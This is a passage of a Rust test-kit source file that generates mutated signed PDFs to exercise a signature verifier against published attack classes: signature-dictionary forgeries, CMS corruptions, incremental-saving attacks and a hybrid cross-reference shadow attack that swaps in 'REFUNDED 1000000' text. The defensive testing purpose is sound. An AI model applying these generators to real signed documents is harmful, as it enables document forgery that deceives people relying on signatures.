//! Byte-level generators for the signed-PDF attack corpus (M3 brief §5.1, §6.3 `sign-attacks`).
//!
//! Each generator takes a **signed** PDF (one of ours, or a pyHanko-signed fixture) and returns a
//! mutated copy that exercises one published attack class:
//!
//! - **USF** (Universal Signature Forgery; Mladenov et al., CCS 2019): same-length, in-place edits
//!   of the signature dictionary's `/ByteRange`, `/Contents` or `/SubFilter`, so the
//!   cross-reference stays valid and the test isolates the dictionary/ByteRange defences (V2–V4)
//!   from structure repair.
//! - **ISA** (Incremental Saving Attack; CCS 2019): a revision appended after the signed
//!   `%%EOF`, well-formed (through the real incremental writer) or deliberately malformed (raw
//!   bytes), exercising the revision/coverage and modification defences (V5, V10).
//! - **SWA** (Signature Wrapping Attack; CCS 2019): the `/ByteRange` gap is made to disagree with
//!   the real `/Contents` token (V4).
//! - **Shadow** (Hide / Replace / Hide-and-Replace; Mainka et al., NDSS 2021): an appended
//!   revision that hides, replaces or re-points signed content (V10).
//!
//! These functions are **pure over bytes** and depend only on `folioxide-syntax` (never on
//! `folioxide-sign`), so the corpus can be built before signing exists. They cannot be fully
//! exercised until a real signature is present (stage 2 applies them to signed fixtures and runs
//! the oracle); the unit tests here check only their byte-level structure, on the unsigned
//! signature-shaped fixture [`sig_shaped`].
//!
//! Every generator returns `None` when its prerequisites are absent (no signature dictionary, a
//! structure the incremental writer refuses, a value too long to overwrite in place), so stage 2
//! can `.expect()` on a fixture it knows carries a signature.
//!
//! The CMS corruptions are byte-level too: the size-preserving ones ([`usf_cms_garbage`],
//! [`usf_cms_content_type_corrupt`], [`usf_ess_mismatch`]) flip bytes in place, and those that
//! change the DER *size* ([`usf_cms_two_signerinfos`], [`usf_cms_no_certificates`],
//! [`usf_cms_econtent_present`]) re-encode the `SignedData` with a small DER walker and write it
//! back zero-padded into the same `/Contents` placeholder with [`mutate_cms_der`], so no offset
//! moves.

use std::collections::BTreeMap;
use std::ops::Range;

use folioxide_syntax::{
    Dict, IncrementalOptions, Object, ObjectId, OpenOptions, Store, StreamData, keys,
};

// =================================================================================================
// A signature-shaped (but unsigned) fixture, for structural unit tests.
// =================================================================================================

/// An unsigned, signature-*shaped* PDF: a one-page document (objects 1–5) plus a signature
/// dictionary (object 6) with the `/ByteRange` and `/Contents` placeholders of §4.2, a merged
/// signature field/widget (object 7) on the page's `/Annots`, and an `/AcroForm` (object 8) whose
/// `/Fields` names the widget. The `/Contents` is `2 * r` zero hex digits.
///
/// Nothing is actually signed (the digest is zero and the CMS is absent), so this is only a
/// scaffold for the byte-level attack generators, not a valid signature. The real signing path
/// (stage 2) produces properly signed fixtures; this lets the generators be unit-tested for
/// structure beforehand.
pub fn sig_shaped(r: usize) -> Vec<u8> {
    let base = crate::fixtures::syntax::minimal();
    build_sig_shaped(&base, r).unwrap_or(base)
}

/// Builds [`sig_shaped`] from `base` (the minimal fixture) through the overlay writer, so the
/// signature objects are appended exactly as a real signature's incremental update would write
/// them. Returns `None` if `base` is not the expected minimal layout.
fn build_sig_shaped(base: &[u8], r: usize) -> Option<Vec<u8>> {
    let store = Store::open_bytes(base.to_vec(), &OpenOptions::default()).ok()?;
    let sig = ObjectId::new(6, 0);
    let widget = ObjectId::new(7, 0);
    let acroform = ObjectId::new(8, 0);

    let mut overlay: BTreeMap<ObjectId, Object> = BTreeMap::new();
    overlay.insert(sig, sig_dict(r));
    overlay.insert(widget, widget_dict(sig));
    overlay.insert(acroform, acroform_dict(widget));

    // Extend the catalog (1) with /AcroForm and the page (3) with /Annots.
    let mut catalog = store.resolve(ObjectId::new(1, 0)).ok()?.as_dict()?.clone();
    catalog.insert("AcroForm", acroform);
    overlay.insert(ObjectId::new(1, 0), Object::Dict(catalog));
    let mut page = store.resolve(ObjectId::new(3, 0)).ok()?.as_dict()?.clone();
    page.insert("Annots", Object::Array(vec![Object::Ref(widget)]));
    overlay.insert(ObjectId::new(3, 0), Object::Dict(page));

    let layout = store
        .incremental_suffix_with_overlay(&IncrementalOptions::default(), &overlay)
        .ok()?;
    let mut out = base.to_vec();
    out.extend_from_slice(layout.suffix());
    Some(out)
}

/// The signature dictionary with placeholders (§4.1, §4.2): `/ByteRange [0 9999999999 9999999999
/// 9999999999]` and `/Contents` as `2 * r` zero hex digits, `/ByteRange` before `/Contents`.
fn sig_dict(r: usize) -> Object {
    let mut d = Dict::new();
    d.insert("Type", Object::name("Sig"));
    d.insert("Filter", Object::name("Adobe.PPKLite"));
    d.insert("SubFilter", Object::name("ETSI.CAdES.detached"));
    d.insert("M", Object::literal_string("D:20261010120000Z"));
    d.insert(
        "ByteRange",
        Object::Array(vec![
            Object::Int(0),
            Object::Int(9_999_999_999),
            Object::Int(9_999_999_999),
            Object::Int(9_999_999_999),
        ]),
    );
    d.insert("Contents", Object::hex_string(vec![0u8; r]));
    Object::Dict(d)
}

/// The merged signature field/widget (§4.1): `/FT /Sig`, `/V` the indirect signature dictionary,
/// `/F 132`, a zero-area `/Rect`, on page 3.
fn widget_dict(sig: ObjectId) -> Object {
    let mut d = Dict::new();
    d.insert("Type", Object::name("Annot"));
    d.insert("Subtype", Object::name("Widget"));
    d.insert("FT", Object::name("Sig"));
    d.insert("T", Object::literal_string("Signature1"));
    d.insert("V", Object::Ref(sig));
    d.insert("F", Object::Int(132));
    d.insert(
        "Rect",
        Object::Array(vec![
            Object::Int(0),
            Object::Int(0),
            Object::Int(0),
            Object::Int(0),
        ]),
    );
    d.insert("P", Object::Ref(ObjectId::new(3, 0)));
    Object::Dict(d)
}

/// The `/AcroForm` (§4.5): `/Fields [widget]`, `/SigFlags 3`.
fn acroform_dict(widget: ObjectId) -> Object {
    let mut d = Dict::new();
    d.insert("Fields", Object::Array(vec![Object::Ref(widget)]));
    d.insert("SigFlags", Object::Int(3));
    Object::Dict(d)
}

// =================================================================================================
// Byte-level primitives.
// =================================================================================================

/// The byte span (delimiters included) of the signature's `/Contents` hexadecimal string: the
/// first `/Contents` key whose value is a `<...>` hex string (so a page's `/Contents N 0 R`
/// reference is skipped). `None` if there is none.
pub fn contents_value_span(pdf: &[u8]) -> Option<Range<usize>> {
    value_span_after_key(pdf, b"/Contents", b'<')
}

/// The byte span (`[` to `]`) of the signature's `/ByteRange` array: the first `/ByteRange` key
/// whose value is an array. `None` if there is none.
pub fn byte_range_value_span(pdf: &[u8]) -> Option<Range<usize>> {
    value_span_after_key(pdf, b"/ByteRange", b'[')
}

/// The value just after key `key` when it begins with `open`: `<...>` (matched to `>`, not a
/// dictionary `<<`), `[...]` (matched to `]`, one level of nesting), or a `/Name`. Scans every
/// occurrence of `key` so a non-matching earlier one (a different value kind) does not stop it.
fn value_span_after_key(pdf: &[u8], key: &[u8], open: u8) -> Option<Range<usize>> {
    let mut from = 0;
    while let Some(rel) = find(pdf.get(from..)?, key) {
        let key_at = from.checked_add(rel)?;
        let after = key_at.checked_add(key.len())?;
        if let Some(start) = skip_ws(pdf, after)
            && pdf.get(start) == Some(&open)
        {
            let span = match open {
                b'<' if pdf.get(start.checked_add(1)?) != Some(&b'<') => hex_span(pdf, start),
                b'[' => array_span(pdf, start),
                b'/' => Some(start..name_end(pdf, start)),
                _ => None,
            };
            if let Some(span) = span {
                return Some(span);
            }
        }
        from = after;
    }
    None
}

/// The span of a `<...>` hexadecimal string starting at `start` (`pdf[start] == b'<'`), up to and
/// including its `>`. `None` if it never closes.
fn hex_span(pdf: &[u8], start: usize) -> Option<Range<usize>> {
    let close = find(pdf.get(start..)?, b">")?;
    Some(start..start.checked_add(close)?.checked_add(1)?)
}

/// The span of a `[...]` array starting at `start` (`pdf[start] == b'['`), balancing one level of
/// nested brackets, up to and including the matching `]`. `None` if it never closes.
fn array_span(pdf: &[u8], start: usize) -> Option<Range<usize>> {
    let mut depth = 0usize;
    for (i, &b) in pdf.get(start..)?.iter().enumerate() {
        match b {
            b'[' => depth = depth.checked_add(1)?,
            b']' => {
                depth = depth.checked_sub(1)?;
                if depth == 0 {
                    return Some(start..start.checked_add(i)?.checked_add(1)?);
                }
            }
            _ => {}
        }
    }
    None
}

/// The end of a `/Name` token starting at `start`: the first PDF delimiter or white-space after
/// the leading `/` (§7.3.5).
fn name_end(pdf: &[u8], start: usize) -> usize {
    let mut i = start.saturating_add(1);
    while let Some(&b) = pdf.get(i) {
        if is_ws(b) || is_delim(b) {
            break;
        }
        i = i.saturating_add(1);
    }
    i
}

/// Replaces `pdf[span]` with `replacement` padded on the right with spaces to the exact width of
/// `span`, so every byte offset after `span` is unchanged (a same-length, in-place USF edit).
/// `None` if `replacement` is longer than `span`.
pub fn replace_padded(pdf: &[u8], span: Range<usize>, replacement: &[u8]) -> Option<Vec<u8>> {
    let width = span.end.checked_sub(span.start)?;
    if replacement.len() > width || span.end > pdf.len() {
        return None;
    }
    let mut out = pdf.to_vec();
    let mut value = replacement.to_vec();
    value.resize(width, b' ');
    out.splice(span.clone(), value);
    Some(out)
}

/// The value of the last `startxref` keyword in `pdf` (the offset of the newest cross-reference
/// section), used to chain a crafted revision with `/Prev`.
pub fn last_startxref(pdf: &[u8]) -> Option<u64> {
    let key = b"startxref";
    let rel = rfind(pdf, key)?;
    let mut i = skip_ws(pdf, rel.checked_add(key.len())?)?;
    let mut value: u64 = 0;
    let mut seen = false;
    while let Some(&b) = pdf.get(i).filter(|b| b.is_ascii_digit()) {
        value = value.checked_mul(10)?.checked_add(u64::from(b - b'0'))?;
        seen = true;
        i = i.checked_add(1)?;
    }
    seen.then_some(value)
}

/// `pdf` with `extra` appended, after an end-of-line if `pdf` does not already end with one (so
/// the appended material starts on its own line, as an incremental update does, §7.5.6).
pub fn append(pdf: &[u8], extra: &[u8]) -> Vec<u8> {
    let mut out = pdf.to_vec();
    if !matches!(pdf.last(), Some(b'\n' | b'\r')) {
        out.push(b'\n');
    }
    out.extend_from_slice(extra);
    out
}

/// The decoded DER of the signature's `/Contents` (the hexadecimal digits before the zero
/// padding), transformed by `f`, re-encoded as uppercase hex and zero-padded back to the original
/// `/Contents` width so no byte offset shifts. `None` when there is no `/Contents`, or when `f`
/// returns `None`, or when the new DER does not fit the placeholder.
///
/// This is the embedding primitive the stage-2 CMS attacks use: `f` builds a mutated
/// `SignedData` (a second `SignerInfo`, dropped certificates, an added `eContent`) from a real
/// one with the `der`/`cms` crates, which the testkit does not depend on.
pub fn mutate_cms_der(pdf: &[u8], f: impl FnOnce(&[u8]) -> Option<Vec<u8>>) -> Option<Vec<u8>> {
    let span = contents_value_span(pdf)?;
    let inner = span.start.checked_add(1)?..span.end.checked_sub(1)?;
    let hex = pdf.get(inner.clone())?;
    let der = decode_hex(hex)?;
    let der = trim_to_der(&der);
    let new = f(der)?;
    let mut new_hex = encode_hex(&new);
    let width = inner.end.checked_sub(inner.start)?;
    if new_hex.len() > width {
        return None;
    }
    new_hex.resize(width, b'0');
    let mut out = pdf.to_vec();
    out.splice(inner, new_hex);
    Some(out)
}

// =================================================================================================
// USF: same-length, in-place edits of /Contents and /ByteRange.
// =================================================================================================

/// `usf_contents_missing`: renames the signature's `/Contents` key to `/Xontents`, so the
/// verifier finds no `/Contents` (V4 `ContentsMissing`). Same length.
pub fn usf_contents_missing(pdf: &[u8]) -> Option<Vec<u8>> {
    rename_sig_key(pdf, b"/Contents", b'<')
}

/// `usf_contents_null`: replaces the `/Contents` hexadecimal string with `null` (V4
/// `ContentsNotHex`). Same length.
pub fn usf_contents_null(pdf: &[u8]) -> Option<Vec<u8>> {
    replace_padded(pdf, contents_value_span(pdf)?, b"null")
}

/// `usf_contents_empty_hex`: replaces the `/Contents` value with the empty hexadecimal string
/// `<>` (V4: the gap can no longer hold a CMS). Same length.
pub fn usf_contents_empty_hex(pdf: &[u8]) -> Option<Vec<u8>> {
    replace_padded(pdf, contents_value_span(pdf)?, b"<>")
}

/// `usf_contents_literal_string`: turns the `/Contents` hexadecimal string into a literal string
/// by swapping its `<`/`>` delimiters for `(`/`)` (V4 `ContentsNotHex`). Same length.
pub fn usf_contents_literal_string(pdf: &[u8]) -> Option<Vec<u8>> {
    let span = contents_value_span(pdf)?;
    let mut out = pdf.to_vec();
    *out.get_mut(span.start)? = b'(';
    *out.get_mut(span.end.checked_sub(1)?)? = b')';
    Some(out)
}

/// `usf_byterange_missing`: renames the signature's `/ByteRange` key to `/CyteRange` (V3
/// `ByteRangeMissing`). Same length.
pub fn usf_byterange_missing(pdf: &[u8]) -> Option<Vec<u8>> {
    rename_sig_key(pdf, b"/ByteRange", b'[')
}

/// `usf_byterange_null`: replaces the `/ByteRange` array with `null` (V3 `ByteRangeMalformed`).
pub fn usf_byterange_null(pdf: &[u8]) -> Option<Vec<u8>> {
    replace_byte_range(pdf, b"null")
}

/// `usf_byterange_two_values`: a two-element `/ByteRange` `[0 0]` (V3 `ByteRangeMalformed`: not
/// four values).
pub fn usf_byterange_two_values(pdf: &[u8]) -> Option<Vec<u8>> {
    replace_byte_range(pdf, b"[0 0]")
}

/// `usf_byterange_negative`: a `/ByteRange` with a negative length (V3 `ByteRangeMalformed`).
pub fn usf_byterange_negative(pdf: &[u8]) -> Option<Vec<u8>> {
    replace_byte_range(pdf, b"[0 -1 0 0]")
}

/// `usf_byterange_not_from_zero`: a `/ByteRange` whose first offset is not 0 (V3
/// `ByteRangeNotFromZero`).
pub fn usf_byterange_not_from_zero(pdf: &[u8]) -> Option<Vec<u8>> {
    replace_byte_range(pdf, b"[1 2 3 4]")
}

/// `usf_byterange_past_eof`: a `/ByteRange` whose second pair runs past the end of the file (V3
/// `ByteRangeOutOfBounds`).
pub fn usf_byterange_past_eof(pdf: &[u8]) -> Option<Vec<u8>> {
    replace_byte_range(pdf, b"[0 10 9999999999 9999999999]")
}

/// `usf_byterange_reals`: a `/ByteRange` of reals instead of integers (V3 `ByteRangeMalformed`).
pub fn usf_byterange_reals(pdf: &[u8]) -> Option<Vec<u8>> {
    replace_byte_range(pdf, b"[0.0 1.0 2.0 3.0]")
}

/// `usf_byterange_indirect`: a `/ByteRange` that is an indirect reference, not a direct array (V3
/// `ByteRangeIndirect`: an indirect array could live in an unsigned later revision).
pub fn usf_byterange_indirect(pdf: &[u8]) -> Option<Vec<u8>> {
    replace_byte_range(pdf, b"1 0 R")
}

/// `usf_byterange_zeroes`: a `/ByteRange` of `[0 0 0 0]` (V3 `ByteRangeMalformed`: `l1 > 0`
/// fails).
pub fn usf_byterange_zeroes(pdf: &[u8]) -> Option<Vec<u8>> {
    replace_byte_range(pdf, b"[0 0 0 0]")
}

/// `usf_subfilter_unknown`: corrupts the signature's `/SubFilter` name to an unknown value by
/// overwriting its first character after the `/` (V2 `UnsupportedSubFilter`). Same length.
pub fn usf_subfilter_unknown(pdf: &[u8]) -> Option<Vec<u8>> {
    let span = value_span_after_key(pdf, b"/SubFilter", b'/')?;
    let mut out = pdf.to_vec();
    *out.get_mut(span.start.checked_add(1)?)? = b'Z';
    Some(out)
}

/// Replaces the signature's `/ByteRange` array with `replacement`, padded to the original width
/// so offsets do not shift.
fn replace_byte_range(pdf: &[u8], replacement: &[u8]) -> Option<Vec<u8>> {
    replace_padded(pdf, byte_range_value_span(pdf)?, replacement)
}

/// Renames the signature key `key` (whose value begins with `open`) by overwriting its first
/// letter after the `/` with `X`, so a verifier no longer finds the key. Same length.
fn rename_sig_key(pdf: &[u8], key: &[u8], open: u8) -> Option<Vec<u8>> {
    // Locate the key by its value, so the signature's key is chosen (not a page's /Contents).
    let value = value_span_after_key(pdf, key, open)?;
    let key_at = rfind(pdf.get(..value.start)?, key)?;
    let mut out = pdf.to_vec();
    *out.get_mut(key_at.checked_add(1)?)? = b'X';
    Some(out)
}

// =================================================================================================
// USF: size-preserving CMS corruptions (OID-keyed byte flips).
// =================================================================================================

/// `usf_cms_garbage`: overwrites the first bytes of the CMS DER with `0xFF`, so the ContentInfo
/// no longer parses (V7 `CmsMalformed`). Same length.
pub fn usf_cms_garbage(pdf: &[u8]) -> Option<Vec<u8>> {
    let span = contents_value_span(pdf)?;
    // The DER begins just after `<`; corrupt its first 8 hex digits (4 bytes).
    let start = span.start.checked_add(1)?;
    let end = start.checked_add(8)?.min(span.end.checked_sub(1)?);
    let mut out = pdf.to_vec();
    for i in start..end {
        if let Some(b) = out.get_mut(i) {
            *b = b'F';
        }
    }
    (end > start).then_some(out)
}

/// `usf_cms_content_type_corrupt`: flips the last byte of the `content-type` attribute OID
/// (1.2.840.113549.1.9.3) inside the CMS, so the attribute is unrecognised (V7
/// `ContentTypeMismatch`). Same length. `None` if the OID is not present (an unsigned or
/// zero-filled `/Contents`).
pub fn usf_cms_content_type_corrupt(pdf: &[u8]) -> Option<Vec<u8>> {
    flip_oid_tail(pdf, &oid_content_type())
}

/// `usf_ess_mismatch`: flips the last byte of the `signing-certificate-v2` attribute OID
/// (1.2.840.113549.1.9.16.2.47), so the ESS signing-certificate check cannot match the signer
/// (V7 `SigningCertificateMismatch`). Same length. `None` if the OID is not present.
pub fn usf_ess_mismatch(pdf: &[u8]) -> Option<Vec<u8>> {
    flip_oid_tail(pdf, &oid_ess_cert_id_v2())
}

/// Finds `oid` (its DER `06 len …` encoding) inside the decoded CMS, flips its last content byte,
/// and writes the DER back into `/Contents`. Same length.
fn flip_oid_tail(pdf: &[u8], oid: &[u8]) -> Option<Vec<u8>> {
    mutate_cms_der(pdf, |der| {
        let at = find(der, oid)?;
        let last = at.checked_add(oid.len())?.checked_sub(1)?;
        let mut out = der.to_vec();
        let b = out.get_mut(last)?;
        *b ^= 0x01;
        Some(out)
    })
}

/// The DER of the `content-type` attribute OID 1.2.840.113549.1.9.3 (`06 09 2A 86 48 86 F7 0D 01
/// 09 03`).
fn oid_content_type() -> [u8; 11] {
    [
        0x06, 0x09, 0x2A, 0x86, 0x48, 0x86, 0xF7, 0x0D, 0x01, 0x09, 0x03,
    ]
}

/// The DER of the `signing-certificate-v2` attribute OID 1.2.840.113549.1.9.16.2.47 (`06 0B 2A 86
/// 48 86 F7 0D 01 09 10 02 2F`).
fn oid_ess_cert_id_v2() -> [u8; 13] {
    [
        0x06, 0x0B, 0x2A, 0x86, 0x48, 0x86, 0xF7, 0x0D, 0x01, 0x09, 0x10, 0x02, 0x2F,
    ]
}

// =================================================================================================
// USF: CMS edits that change the DER size (re-encoded, then zero-padded into the placeholder).
// =================================================================================================

/// The DER tag of a SEQUENCE.
const TAG_SEQUENCE: u8 = 0x30;
/// The DER tag of a SET.
const TAG_SET: u8 = 0x31;
/// The DER tag of an OCTET STRING.
const TAG_OCTET_STRING: u8 = 0x04;
/// The DER tag `[0]` constructed (context-specific): `[0] EXPLICIT` content of a ContentInfo,
/// `[0] IMPLICIT` certificates of a SignedData, `[0] EXPLICIT` eContent (RFC 5652 §5.1–§5.2).
const TAG_CONTEXT_0: u8 = 0xA0;

/// `usf_cms_two_signerinfos`: the SignedData's `signerInfos` SET gains a second SignerInfo, a
/// copy of the first whose signature value has its last byte flipped (an extra, unverifiable
/// signer after the real one; RFC 5652 §5.1). PAdES allows exactly one SignerInfo (V7
/// `SignerInfoCount`). The CMS grows; `None` if it no longer fits the placeholder.
pub fn usf_cms_two_signerinfos(pdf: &[u8]) -> Option<Vec<u8>> {
    mutate_cms_der(pdf, |der| {
        edit_signed_data(der, |fields| {
            let (_, infos) = fields.iter_mut().rev().find(|(tag, _)| *tag == TAG_SET)?;
            let (tag, first) = der_elements(infos)?.into_iter().next()?;
            let mut parts: Vec<(u8, Vec<u8>)> = der_elements(first)?
                .into_iter()
                .map(|(t, c)| (t, c.to_vec()))
                .collect();
            // The signature value is the SignerInfo's last OCTET STRING (no unsigned attributes).
            let (_, signature) = parts
                .iter_mut()
                .rev()
                .find(|(t, _)| *t == TAG_OCTET_STRING)?;
            let last = signature.last_mut()?;
            *last ^= 0x01;
            let copy = der_encode(tag, &concat_elements(&parts));
            infos.extend_from_slice(&copy);
            Some(())
        })
    })
}

/// `usf_cms_no_certificates`: the SignedData's `certificates` field (`[0] IMPLICIT`) is removed,
/// so the CMS carries no signer certificate (V7 `SignerCertNotFound`; PAdES requires the signing
/// certificate in `SignedData.certificates`). The CMS shrinks.
pub fn usf_cms_no_certificates(pdf: &[u8]) -> Option<Vec<u8>> {
    mutate_cms_der(pdf, |der| {
        edit_signed_data(der, |fields| {
            let before = fields.len();
            fields.retain(|(tag, _)| *tag != TAG_CONTEXT_0);
            (fields.len() < before).then_some(())
        })
    })
}

/// `usf_cms_econtent_present`: the SignedData's `encapContentInfo` gains an `eContent` (`[0]
/// EXPLICIT OCTET STRING`), so the "detached" signature encapsulates content of its own (V7
/// `EContentPresent`; a detached PAdES signature must have none). The CMS grows; `None` if it no
/// longer fits the placeholder.
pub fn usf_cms_econtent_present(pdf: &[u8]) -> Option<Vec<u8>> {
    mutate_cms_der(pdf, |der| {
        edit_signed_data(der, |fields| {
            // version, digestAlgorithms, encapContentInfo, ...
            let (tag, encap) = fields.get_mut(2)?;
            if *tag != TAG_SEQUENCE {
                return None;
            }
            let content = der_encode(TAG_OCTET_STRING, b"content the signer never saw");
            encap.extend_from_slice(&der_encode(TAG_CONTEXT_0, &content));
            Some(())
        })
    })
}

/// Applies `edit` to the fields of the SignedData inside a DER ContentInfo (`SEQUENCE {
/// contentType, [0] EXPLICIT SignedData }`, RFC 5652 §3, §5.1) and re-encodes the whole
/// ContentInfo with the new lengths. `None` when `der` does not have that shape or `edit`
/// declines.
fn edit_signed_data(
    der: &[u8],
    edit: impl FnOnce(&mut Vec<(u8, Vec<u8>)>) -> Option<()>,
) -> Option<Vec<u8>> {
    let (ci_tag, content_info) = single_element(der)?;
    let ci = der_elements(content_info)?;
    let [(oid_tag, oid), (explicit_tag, explicit)] = ci.as_slice() else {
        return None;
    };
    let (sd_tag, signed_data) = single_element(explicit)?;
    let mut fields: Vec<(u8, Vec<u8>)> = der_elements(signed_data)?
        .into_iter()
        .map(|(tag, content)| (tag, content.to_vec()))
        .collect();
    edit(&mut fields)?;
    let signed_data = der_encode(sd_tag, &concat_elements(&fields));
    let content_info = concat_elements(&[(*oid_tag, oid.to_vec()), (*explicit_tag, signed_data)]);
    Some(der_encode(ci_tag, &content_info))
}

/// The one TLV `der` consists of: its tag and content.
fn single_element(der: &[u8]) -> Option<(u8, &[u8])> {
    match der_elements(der)?.as_slice() {
        [(tag, content)] => Some((*tag, *content)),
        _ => None,
    }
}

/// The consecutive DER TLVs of `input` (single-byte tags, definite lengths): `(tag, content)`.
/// `None` when a TLV is malformed or runs past the end.
fn der_elements(input: &[u8]) -> Option<Vec<(u8, &[u8])>> {
    let mut out = Vec::new();
    let mut rest = input;
    while !rest.is_empty() {
        let tag = *rest.first()?;
        if tag & 0x1F == 0x1F {
            return None; // a multi-byte tag: not in a PAdES CMS
        }
        let total = der_total_len(rest)?;
        let element = rest.get(..total)?;
        out.push((tag, element.get(der_header_len(element)?..)?));
        rest = rest.get(total..)?;
    }
    Some(out)
}

/// The header length (tag and length octets) of the definite-length TLV at the start of `der`.
fn der_header_len(der: &[u8]) -> Option<usize> {
    let len_byte = *der.get(1)?;
    if len_byte < 0x80 {
        Some(2)
    } else {
        2usize.checked_add(usize::from(len_byte & 0x7F))
    }
}

/// The DER TLV of `tag` and `content` (definite length, shortest form, X.690 §8.1.3).
fn der_encode(tag: u8, content: &[u8]) -> Vec<u8> {
    let mut out = Vec::with_capacity(content.len().saturating_add(6));
    out.push(tag);
    let len = content.len();
    if len < 0x80 {
        out.push(len as u8);
    } else {
        let bytes = len.to_be_bytes();
        let skip = bytes.iter().take_while(|&&b| b == 0).count();
        let significant = bytes.get(skip..).unwrap_or_default();
        out.push(0x80 | significant.len() as u8);
        out.extend_from_slice(significant);
    }
    out.extend_from_slice(content);
    out
}

/// The DER encodings of `elements`, concatenated.
fn concat_elements(elements: &[(u8, Vec<u8>)]) -> Vec<u8> {
    elements
        .iter()
        .flat_map(|(tag, content)| der_encode(*tag, content))
        .collect()
}

// =================================================================================================
// ISA: appended revisions (well-formed, through the real writer; or malformed raw bytes).
// =================================================================================================

/// `isa_classic_content_replaced`: a well-formed revision that redefines the first page's content
/// stream (V10: `EntireRevision`, `Other`). `None` if there is no page content stream, or the
/// store refuses an incremental update.
pub fn isa_classic_content_replaced(pdf: &[u8]) -> Option<Vec<u8>> {
    with_incremental(pdf, |store| {
        let content = first_page_contents(store)?;
        set_stream(store, content, b"BT /F1 12 Tf (REPLACED) Tj ET")
    })
}

/// `isa_free_object`: a well-formed revision that frees the first page's content stream (V10 (7):
/// freeing anything is `Other`).
pub fn isa_free_object(pdf: &[u8]) -> Option<Vec<u8>> {
    with_incremental(pdf, |store| {
        let content = first_page_contents(store)?;
        store.free(content).ok()
    })
}

/// `isa_relist_identical`: a well-formed revision that re-lists an object with byte-identical
/// bytes (V10: a re-listing is `LtaUpdates`, probe `C_relist`).
pub fn isa_relist_identical(pdf: &[u8]) -> Option<Vec<u8>> {
    with_incremental(pdf, |store| {
        let id = first_page(store)?;
        let value = store.resolve(id).ok()?;
        store.set(id, Object::clone(&value)).ok()
    })
}

/// `isa_info_only`: a well-formed revision that adds (or replaces) the trailer `/Info` dictionary
/// (V10 (6): an `/Info`-only update is `LtaUpdates`).
pub fn isa_info_only(pdf: &[u8]) -> Option<Vec<u8>> {
    with_incremental(pdf, |store| {
        let mut info = Dict::new();
        info.insert("Producer", Object::literal_string("folioxide-testkit"));
        let id = store.add(Object::Dict(info)).ok()?;
        store.set_trailer_entry(keys::INFO, Object::Ref(id)).ok()
    })
}

/// `isa_objects_without_xref`: an object header appended after `%%EOF` with no `startxref` (V10
/// repair rule: `UnreferencedUpdate`, `Other`; pyHanko reports `NONE`, a deliberate difference).
pub fn isa_objects_without_xref(pdf: &[u8]) -> Option<Vec<u8>> {
    Some(append(
        pdf,
        b"4 0 obj\n<< /Type /Catalog /Shadow true >>\nendobj\n",
    ))
}

/// `isa_xref_without_trailer`: a cross-reference section appended with no trailer and no
/// `startxref` (V10 repair rule: `Other`).
pub fn isa_xref_without_trailer(pdf: &[u8]) -> Option<Vec<u8>> {
    Some(append(pdf, b"xref\n0 1\n0000000000 65535 f \n"))
}

/// `isa_bad_startxref_update`: an object and a `startxref` pointing nowhere (V10 repair rule:
/// `Other`).
pub fn isa_bad_startxref_update(pdf: &[u8]) -> Option<Vec<u8>> {
    Some(append(
        pdf,
        b"4 0 obj\n<< /Shadow true >>\nendobj\nstartxref\n999999999\n%%EOF\n",
    ))
}

/// `isa_prev_skips_signed_revision`: a well-formed appended revision whose trailer `/Prev` is
/// rewritten to `0`, so it skips the signed revision (V5 `SignedRevisionNotInChain`,
/// `ContiguousBlockFromStart`). `None` if the writer produced no `/Prev`.
pub fn isa_prev_skips_signed_revision(pdf: &[u8]) -> Option<Vec<u8>> {
    let whole = isa_info_only(pdf)?;
    // Rewrite the last `/Prev <n>` (in the appended trailer) to `/Prev 0`, padded.
    let prev_at = rfind(&whole, b"/Prev ")?;
    let num_start = prev_at.checked_add(b"/Prev ".len())?;
    let mut num_end = num_start;
    while whole.get(num_end).is_some_and(u8::is_ascii_digit) {
        num_end = num_end.checked_add(1)?;
    }
    replace_padded(&whole, num_start..num_end, b"0")
}

/// `isa_hybrid_table_vs_xrefstm`: a real hybrid-reference update (§7.5.8.4) whose two halves
/// disagree about the first page's content stream: the cross-reference **table** lists it at a
/// byte-identical copy of the signed object, while the update's cross-reference **stream** (the
/// trailer's `/XRefStm`) lists it at a different stream. A reader that prefers the table shows the
/// signed content, one that prefers the stream shows the attacker's (V10 union: `Other`; pyHanko
/// reads the table, finds an identical object and reports `LTA_UPDATES`, expert finding 13).
/// `None` without a page content stream in the file, or for a file with bytes before its header.
pub fn isa_hybrid_table_vs_xrefstm(pdf: &[u8]) -> Option<Vec<u8>> {
    let store = Store::open_bytes(pdf.to_vec(), &OpenOptions::default()).ok()?;
    if store.header_offset() != 0 || store.structure_repaired() {
        return None;
    }
    let content = first_page_contents(&store)?;
    let folioxide_syntax::ObjectLocation::InFile { start, end } = store.object_location(content)?
    else {
        return None;
    };
    let signed_copy = pdf.get(usize::try_from(start).ok()?..usize::try_from(end).ok()?)?;
    let prev = last_startxref(pdf)?;
    let xref_stream = store.next_object_number();
    let root = store.root_id()?;
    let (num, generation) = (content.num, content.r#gen);

    let mut out = append(pdf, b"");
    let copy_at = out.len();
    out.extend_from_slice(signed_copy);
    if !signed_copy.ends_with(b"\n") {
        out.push(b'\n');
    }
    let evil_at = out.len();
    let evil = b"BT /F1 24 Tf 72 720 Td (REFUNDED 1000000) Tj ET";
    out.extend_from_slice(
        format!(
            "{num} {generation} obj\n<< /Length {} >>\nstream\n",
            evil.len()
        )
        .as_bytes(),
    );
    out.extend_from_slice(evil);
    out.extend_from_slice(b"\nendstream\nendobj\n");
    // The stream half: one type-1 entry for the content stream, at the attacker's object.
    let stream_at = out.len();
    let mut row = vec![1u8];
    row.extend_from_slice(&u32::try_from(evil_at).ok()?.to_be_bytes());
    row.extend_from_slice(&generation.to_be_bytes());
    out.extend_from_slice(
        format!(
            "{xref_stream} 0 obj\n<< /Type /XRef /Size {} /W [1 4 2] /Index [{num} 1] \
             /Length {} >>\nstream\n",
            xref_stream + 1,
            row.len()
        )
        .as_bytes(),
    );
    out.extend_from_slice(&row);
    out.extend_from_slice(b"\nendstream\nendobj\n");
    // The table half: the signed copy, and the cross-reference stream object itself.
    let table_at = out.len();
    let mut trailer = format!(
        "xref\n0 1\n0000000000 65535 f \n{num} 1\n{copy_at:010} {generation:05} n \n\
         {xref_stream} 1\n{stream_at:010} 00000 n \ntrailer\n<< /Size {} /Root {} {} R \
         /Prev {prev} /XRefStm {stream_at}",
        xref_stream + 1,
        root.num,
        root.r#gen
    );
    if let Some(info) = store.trailer().get_ref(keys::INFO) {
        trailer.push_str(&format!(" /Info {} {} R", info.num, info.r#gen));
    }
